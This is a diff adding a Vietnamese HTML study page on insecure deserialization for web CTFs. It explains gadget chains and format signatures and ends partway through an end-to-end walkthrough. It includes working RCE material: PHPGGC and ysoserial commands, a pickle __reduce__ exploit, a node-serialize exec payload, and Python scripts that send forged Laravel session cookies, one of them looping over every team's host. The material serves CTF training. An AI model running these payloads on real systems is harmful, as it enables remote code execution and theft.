@@ -1,0 +1,542 @@
+<title>Insecure Deserialization — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · Deserialization &amp; Prototype Pollution</div>
+    <h1>Insecure Deserialization</h1>
+    <p class="sub">Khi app nhận 1 chuỗi đã "đóng gói" (serialize) object — thường qua cookie/token — rồi tự động
+    "mở gói" (deserialize) lại thành object thật mà không kiểm tra nội dung, bạn có thể tự tạo 1 chuỗi độc, khiến
+    quá trình mở gói tự gọi các hàm có sẵn trong code theo trình tự bạn chọn (gọi là <em>gadget chain</em>),
+    thường dẫn thẳng tới RCE.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Theo ngôn ngữ</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>Insecure Deserialization là gì, để làm gì?</h2>
+  <p class="lead"><strong>Serialize</strong> là biến 1 object trong bộ nhớ thành 1 chuỗi text/byte để lưu trữ
+  hoặc gửi đi (vd lưu session, gửi qua cookie). <strong>Deserialize</strong> là chiều ngược lại — đọc chuỗi đó,
+  tự động "dựng lại" thành object thật, gọi cả các hàm đặc biệt của object đó (constructor, destructor...) trong
+  quá trình dựng. Nếu app deserialize dữ liệu từ <strong>người dùng</strong> (không chỉ dữ liệu tự nó tạo ra),
+  bạn có thể tự viết 1 chuỗi serialize giả, chọn đúng class nào được dựng — nếu trong code có sẵn 1 chuỗi class
+  mà hàm đặc biệt của chúng (khi gọi liên tiếp) dẫn tới thực thi lệnh, bạn đạt RCE chỉ bằng cách gửi đúng chuỗi.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  Dấu hiệu nhận biết theo định dạng chuỗi base64: PHP bắt đầu <code>Tzo</code>/<code>YTo</code>, Python pickle
+  bắt đầu <code>gASV</code>/<code>gAJ</code>, Java bắt đầu <code>rO0AB</code>. Thấy 1 trong các dấu hiệu này trong
+  cookie/token ⟹ gần như chắc chắn có deserialization, và cách khai thác luôn là <strong>dùng công cụ sinh sẵn
+  gadget chain</strong> (PHPGGC/ysoserial) thay vì tự viết tay.</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ INSECURE DESERIALIZATION</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Cookie/token base64 decode ra chuỗi bắt đầu <code>Tzo</code>/<code>YTo</code> (PHP),
+        <code>gASV</code>/<code>gAJ</code> (Python pickle), hoặc byte đầu <code>ac ed 00 05</code> (Java) ⟹ xác
+        định ngay ngôn ngữ, lật đúng mục 06/07.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Có 1 chuỗi serialize hợp lệ của chính app để tham khảo cấu trúc (lấy từ cookie thường), và biết (hoặc
+        đoán) được các class/thư viện app đang dùng (qua source nếu có, hoặc qua lỗi/stack trace).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh</span>
+        Decode base64 cookie hiện tại, xem có đúng định dạng serialize của ngôn ngữ nào không trước khi thử sinh
+        payload.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay (PHP — hay gặp nhất)</span>
+<pre><code><span class="c"># Sinh gadget chain PHP bằng phpggc (không cần tự viết tay)</span>
+cd ~/hoc/CTF/Tools/web/phpggc
+./phpggc Laravel/RCE9 system id
+
+<span class="c"># Chuỗi in ra -- base64-encode rồi dán vào cookie/field tương ứng</span></code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> subprocess, base64, requests
+
+payload = subprocess.check_output(
+    [<span class="s">"./phpggc"</span>, <span class="s">"Laravel/RCE9"</span>, <span class="s">"system"</span>, <span class="s">"cat flag.txt"</span>],
+    cwd=<span class="s">"/home/ld/hoc/CTF/Tools/web/phpggc"</span>)
+cookie = base64.b64encode(payload).decode()
+r = requests.get(<span class="s">"http://TARGET/"</span>, cookies={<span class="s">"laravel_session"</span>: cookie})
+<span class="k">print</span>(r.text)</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Gadget chain phụ thuộc đúng PHIÊN BẢN thư viện (Laravel, Symfony...) — thử nhiều gadget khác nhau nếu
+        cái đầu không ăn. WAF rule nhanh: chặn chuỗi base64 decode ra khớp <code>^O:\d+:"</code> (PHP serialize
+        object) hoặc <code>^\x80\x04</code> (Python pickle protocol 4). Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>Serialize/Deserialize</b> — chuyển object ↔ chuỗi, để lưu trữ/truyền đi rồi khôi phục lại
+  object y hệt ban đầu.</div>
+  <div class="def"><b>Magic method</b> — các hàm đặc biệt trong class được ngôn ngữ <strong>tự động gọi</strong>
+  ở thời điểm nhất định, không cần gọi tường minh. Ví dụ PHP: <code>__wakeup()</code> (gọi ngay sau
+  unserialize), <code>__destruct()</code> (gọi khi object bị hủy), <code>__toString()</code> (gọi khi object
+  được dùng như chuỗi).</div>
+  <div class="def"><b>Gadget chain / POP chain</b> — một chuỗi các class có sẵn trong code (của chính app hoặc
+  thư viện nó dùng), khi được "dựng" liên tiếp qua các magic method, cuối cùng dẫn tới 1 hành động nguy hiểm (gọi
+  lệnh hệ thống). Không cần app có lỗi gì đặc biệt — chỉ cần nó "tình cờ" chứa đủ các class ghép lại được thành
+  chuỗi này (thường từ framework/thư viện phổ biến, không phải code tự viết).</div>
+  <p>Code hay viết (deserialize dữ liệu từ người dùng):</p>
+  <pre><code><span class="c">// PHP</span>
+$data = unserialize($_COOKIE[<span class="s">'user_data'</span>]);   <span class="c">// input từ cookie, người dùng tự sửa được</span></code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Magic method chạy TỰ ĐỘNG, không hỏi ý bạn</h2>
+  <p>Vấn đề cốt lõi: quá trình deserialize không chỉ "đọc dữ liệu" — nó <strong>thực thi code</strong> (magic
+  method) như một tác dụng phụ tự động. Bạn, với vai trò kẻ tấn công, <strong>chọn được class nào</strong> sẽ bị
+  dựng (chuỗi serialize ghi rõ tên class), nên bạn chọn đúng class có magic method làm điều bạn muốn — dù chính
+  bạn không hề viết ra class đó, nó vốn đã có sẵn trong framework/thư viện app dùng.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>Chuỗi gadget: A gọi B gọi C ... tới RCE</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 190" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr20)}
+    </style>
+    <defs><marker id="arr20" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="155" height="55" rx="10" class="box-a"/>
+    <text x="22" y="40" class="lbl-m">unserialize(cookie)</text>
+    <text x="22" y="56" class="lbl-a">dựng object class A</text>
+
+    <path d="M165,48 H200" class="arrow"/>
+    <rect x="205" y="20" width="155" height="55" rx="10" class="box"/>
+    <text x="217" y="40" class="lbl-m">__wakeup() của A</text>
+    <text x="217" y="56" class="lbl">tự gọi method của B</text>
+
+    <path d="M360,48 H395" class="arrow"/>
+    <rect x="400" y="20" width="155" height="55" rx="10" class="box"/>
+    <text x="412" y="40" class="lbl-m">B.method() tự gọi</text>
+    <text x="412" y="56" class="lbl">__toString() của C</text>
+
+    <path d="M477,80 V105" class="arrow"/>
+    <rect x="400" y="110" width="155" height="55" rx="10" class="box-a"/>
+    <text x="412" y="130" class="lbl-m">C.__toString()</text>
+    <text x="412" y="146" class="lbl-a">gọi system($cmd) -&gt; RCE!</text>
+  </svg>
+  </div>
+  <p>Toàn bộ chuỗi A→B→C này <strong>không phải do bạn viết</strong> — nó là các class có sẵn trong framework
+  (Laravel, Symfony, Monolog...). Việc tìm ra đúng chuỗi gadget nào tồn tại cho từng framework/phiên bản là công
+  việc rất phức tạp, tốn nhiều công sức nghiên cứu — đây chính là lý do công cụ như PHPGGC/ysoserial (đã có
+  người làm sẵn, đóng gói thành thư viện gadget) quan trọng tới vậy (mục 07): bạn không cần tự nghiên cứu, chỉ
+  cần chọn đúng gadget khớp với framework/phiên bản app đang dùng.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu theo ngôn ngữ</h2>
+  <table>
+    <tr><th>Ngôn ngữ</th><th>Dấu hiệu base64/byte đầu</th><th>Framework hay gặp gadget sẵn</th></tr>
+    <tr><td>PHP</td><td><code>Tzo</code> (object), <code>YTo</code> (array)</td><td>Laravel, Symfony, CodeIgniter, WordPress</td></tr>
+    <tr><td>Python</td><td><code>gASV</code>/<code>gAJ</code> (pickle), hoặc dùng <code>yaml.load()</code> không safe</td><td>Django (hiếm dùng pickle trực tiếp cho session mặc định), app tự viết cache bằng pickle</td></tr>
+    <tr><td>Java</td><td>Byte <code>ac ed 00 05</code>, hoặc base64 <code>rO0AB</code></td><td>Apache Commons Collections, Spring, Hibernate (qua ysoserial)</td></tr>
+    <tr><td>Node.js</td><td>Chuỗi chứa <code>_$$ND_FUNC$$_</code> (thư viện <code>node-serialize</code>)</td><td>App cũ dùng node-serialize cho cookie</td></tr>
+    <tr><td>Ruby</td><td><code>!ruby/object</code> (trong YAML), hoặc Marshal format</td><td>Rails dùng YAML cho 1 số cấu hình/cookie cũ</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Decode cookie hiện tại để xác nhận định dạng</span>
+  <ol style="margin:4px 0 0">
+    <li>Bắt request có cookie nghi ngờ, copy giá trị.</li>
+    <li>Dùng CyberChef (mục 07) decode Base64, xem chuỗi kết quả có khớp định dạng serialize ngôn ngữ nào
+    (mục 04).</li>
+    <li>Sau khi sinh payload bằng công cụ (PHPGGC/ysoserial), base64-encode lại (CyberChef hoặc tay), dán vào
+    Repeater thay giá trị cookie cũ, Send.</li>
+  </ol></div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / THEO NGÔN NGỮ — CÁCH TIẾP CẬN KHÁC NHAU</div>
+  <h2>Mỗi ngôn ngữ một kiểu gadget</h2>
+
+  <h3>A. PHP — <code>unserialize()</code></h3>
+  <p>Magic method quan trọng: <code>__wakeup()</code> (sau unserialize), <code>__destruct()</code> (khi object
+  hết phạm vi sống), <code>__toString()</code> (khi ép kiểu chuỗi). Dùng PHPGGC (mục 07) để sinh gadget theo
+  đúng framework. Lưu ý: <strong>Phar deserialization</strong> — nếu app gọi các hàm filesystem
+  (<code>file_exists</code>, <code>unlink</code>...) trên 1 đường dẫn bạn kiểm soát, đổi thành
+  <code>phar://đường_dẫn_tới_file_phar_độc</code> cũng kích hoạt unserialize dù không gọi trực tiếp.</p>
+
+  <h3>B. Python — <code>pickle</code></h3>
+  <p>Gadget chuẩn: định nghĩa <code>__reduce__()</code> trả về <code>(os.system, ("id",))</code> — khi
+  unpickle, Python tự gọi hàm đó với tham số đó.</p>
+  <pre><code><span class="k">import</span> pickle, os, base64
+
+<span class="k">class</span> <span class="d">Exploit</span>:
+    <span class="k">def</span> <span class="d">__reduce__</span>(self):
+        <span class="k">return</span> (os.system, (<span class="s">"cat flag.txt"</span>,))
+
+payload = base64.b64encode(pickle.dumps(Exploit())).decode()
+<span class="k">print</span>(payload)   <span class="c"># dán vào cookie/field cần</span></code></pre>
+  <div class="note tip"><span class="tag">Không cần công cụ ngoài cho Python</span>Pickle gadget tự viết trực
+  tiếp bằng <code>__reduce__()</code> như trên là đủ, không cần công cụ chuyên dụng như PHPGGC/ysoserial.</div>
+
+  <h3>C. Java — ysoserial</h3>
+  <p>Phức tạp hơn nhiều (cần đúng gadget khớp thư viện trên classpath của app) — luôn dùng ysoserial (mục 07),
+  gần như không tự viết tay. Lưu ý: Java là ngôn ngữ <strong>ít gặp nhất</strong> ở CTF sinh viên theo khảo sát
+  tần suất (xem bài Recon/tổng quan) — đầu tư thời gian ít hơn PHP/Python nếu phải chọn ưu tiên.</p>
+
+  <h3>D. Node.js — <code>node-serialize</code></h3>
+  <pre><code><span class="c">// Payload: function bị serialize thành chuỗi đặc biệt, deserialize lại thành code chạy được</span>
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('cat flag.txt', function(e,out){console.log(out)});}()"}</code></pre>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: PHPGGC, YSOSERIAL &amp; CYBERCHEF</div>
+  <h2>Không tự nghiên cứu gadget chain — dùng công cụ đã làm sẵn</h2>
+
+  <h3>A. PHPGGC — sinh gadget chain PHP</h3>
+  <div class="def"><b>PHPGGC</b> — thư viện gadget chain PHP đã biên soạn sẵn cho hàng chục framework
+  (Laravel, Symfony, CodeIgniter, WordPress, Monolog...), bạn chỉ cần chọn tên gadget + lệnh muốn chạy, công cụ
+  tự sinh chuỗi serialize đúng. Đã clone về <code>~/hoc/CTF/Tools/web/phpggc/</code> (từ <code>ambionics/phpggc</code>,
+  3900+ sao).</div>
+  <pre><code>cd ~/hoc/CTF/Tools/web/phpggc
+./phpggc -l                        <span class="c"># liệt kê MỌI gadget có sẵn theo framework</span>
+./phpggc -l laravel                 <span class="c"># chỉ liệt kê gadget của Laravel</span>
+./phpggc Laravel/RCE9 system id -b  <span class="c"># sinh payload, -b = tự base64-encode luôn</span></code></pre>
+
+  <h3>B. ysoserial — sinh gadget chain Java</h3>
+  <div class="def"><b>ysoserial</b> — tương tự PHPGGC nhưng cho Java, hỗ trợ nhiều gadget (CommonsCollections1-7,
+  Spring1-2...). Đã clone về <code>~/hoc/CTF/Tools/web/ysoserial/</code> (từ <code>frohoff/ysoserial</code>, 9000+ sao).</div>
+  <div class="note warn"><span class="tag">Cần build trước ngày thi</span>ysoserial là mã nguồn Java, cần build
+  bằng Maven (<code>mvn clean package -DskipTests</code>) ra file <code>.jar</code> mới dùng được — làm việc này
+  TRƯỚC ngày thi (cần Internet để Maven tải dependency), không build được trong phòng thi. <code>pom.xml</code>
+  khoá cứng <code>source/target=1.6</code> — JDK hiện đại (17+) không biên dịch được mức này, cần sửa lên
+  <code>8</code> trước khi build.</div>
+  <div class="note warn"><span class="tag">Phải CHẠY bằng JDK ≤16, không phải JDK mặc định</span>Từ JDK 17, Java
+  xoá hẳn gói <code>java.rmi.activation</code> (2 payload Jenkins/JRMP build lỗi nếu chưa gỡ) VÀ JDK 16+ chặn
+  reflection module-private theo mặc định — chạy bằng <code>java</code> hệ thống (nếu là JDK 17+) sẽ ra lỗi
+  <code>InaccessibleObjectException</code> dù jar build thành công. Cài thêm 1 JDK 11 riêng
+  (<code>sudo apt install openjdk-11-jdk</code>), dùng JDK 11 cho CẢ build lẫn chạy:</div>
+  <pre><code><span class="c"># Build (1 lần, trước ngày thi)</span>
+cd ~/hoc/CTF/Tools/web/ysoserial
+JAVA_HOME=/usr/lib/jvm/java-11-openjdk-amd64 mvn clean package -DskipTests
+
+<span class="c"># Chạy -- LUÔN dùng java của JDK 11, không dùng "java" mặc định nếu máy có JDK 17+</span>
+/usr/lib/jvm/java-11-openjdk-amd64/bin/java -jar target/ysoserial-0.0.6-SNAPSHOT-all.jar \
+  CommonsCollections6 <span class="s">"cat /flag.txt"</span> &gt; payload.bin</code></pre>
+
+  <h3>C. CyberChef — decode/encode base64 serialize</h3>
+  <p>Mở <code>~/hoc/CTF/Tools/web/CyberChef/CyberChef_v11.6.0.html</code> — dùng khối <strong>From Base64</strong> để
+  xem nhanh định dạng chuỗi (xác nhận PHP/Python/Java theo mục 04) mà không cần tự chạy Python decode mỗi lần.</p>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước (ví dụ PHP/PHPGGC)</h3>
+  <pre><code><span class="k">import</span> subprocess, base64, requests
+
+<span class="c"># Bước 1: sinh gadget chain bằng phpggc</span>
+raw = subprocess.check_output(
+    [<span class="s">"./phpggc"</span>, <span class="s">"Laravel/RCE9"</span>, <span class="s">"system"</span>, <span class="s">"id"</span>],
+    cwd=<span class="s">"/home/ld/hoc/CTF/Tools/web/phpggc"</span>)
+cookie_value = base64.b64encode(raw).decode()
+
+<span class="c"># Bước 2: dán vào cookie, gửi request</span>
+r = requests.get(<span class="s">"http://TARGET/"</span>, cookies={<span class="s">"laravel_session"</span>: cookie_value})
+<span class="k">print</span>(r.text)</code></pre>
+
+  <h3>(B) Bản gọn chắc — trích thẳng flag</h3>
+  <pre><code><span class="k">import</span> re, subprocess, base64, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PHPGGC = <span class="s">"/home/ld/hoc/CTF/Tools/web/phpggc/phpggc"</span>
+
+<span class="k">def</span> <span class="d">exploit_deser</span>(host):
+    raw = subprocess.check_output([PHPGGC, <span class="s">"Laravel/RCE9"</span>, <span class="s">"system"</span>, <span class="s">"cat flag.txt"</span>])
+    cookie = base64.b64encode(raw).decode()
+    r = requests.get(<span class="s">f"http://{host}/"</span>, cookies={<span class="s">"laravel_session"</span>: cookie}, timeout=5)
+    m = FLAG_RE.search(r.text)
+    <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+
+<span class="k">print</span>(<span class="s">"FLAG:"</span>, exploit_deser(<span class="s">"TARGET_IP"</span>))</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — sinh payload 1 lần, tái dùng mọi đội</h3>
+  <pre><code><span class="k">import</span> re, subprocess, base64, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+PHPGGC = <span class="s">"/home/ld/hoc/CTF/Tools/web/phpggc/phpggc"</span>
+
+<span class="c"># Sinh payload 1 LẦN DUY NHẤT (gadget chain giống nhau cho mọi đội vì cùng service)</span>
+RAW = subprocess.check_output([PHPGGC, <span class="s">"Laravel/RCE9"</span>, <span class="s">"system"</span>, <span class="s">"cat flag.txt"</span>])
+COOKIE = base64.b64encode(RAW).decode()
+
+<span class="k">def</span> <span class="d">exploit_deser</span>(host):
+    <span class="k">try</span>:
+        r = requests.get(<span class="s">f"http://{host}/"</span>, cookies={<span class="s">"laravel_session"</span>: COOKIE}, timeout=5)
+        m = FLAG_RE.search(r.text)
+        <span class="k">return</span> m.group() <span class="k">if</span> m <span class="k">else</span> <span class="k">None</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">None</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        flag = exploit_deser(host)
+        <span class="k">if</span> flag:
+            <span class="k">print</span>(<span class="s">f"{host} {flag}"</span>)
+            <span class="k">with</span> open(<span class="s">"flags.txt"</span>, <span class="s">"a"</span>) <span class="k">as</span> f:
+                f.write(<span class="s">f"{flag}\n"</span>)</code></pre>
+  <div class="note tip"><span class="tag">Hiệu quả hơn bài trước</span>Khác các bài khác phải gửi lại payload mỗi
+  lần, ở đây payload <strong>sinh 1 lần</strong> (gọi PHPGGC 1 lần ngoài vòng lặp) rồi tái sử dụng cho mọi đội —
+  nhanh hơn vì không tốn thời gian gọi subprocess lặp lại.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
+  <h2>Từ nhận service tới lấy flag</h2>
+  <div class="struct">
+    <div class="srow"><span class="n">1</span><div><div class="t">Recon</div><div class="d">Service PHP dùng Laravel (header/cookie <code>laravel_session</code>, <code>XSRF-TOKEN</code>).</div></div></div>
+    <div class="srow"><span class="n">2</span><div><div class="t">Xác nhận deserialization</div><div class="d">Decode cookie hiện tại bằng CyberChef — thấy dạng <code>Tzo</code> sau giải mã base64 ⟹ xác nhận PHP object serialize.</div></div></div>
+    <div class="srow"><span class="n">3</span><div><div class="t">Sinh gadget</div><div class="d"><code>./phpggc -l laravel</code> xem danh sách gadget, thử <code>Laravel/RCE9</code> trước (gadget phổ biến nhất cho bản Laravel mới).</div></div></div>
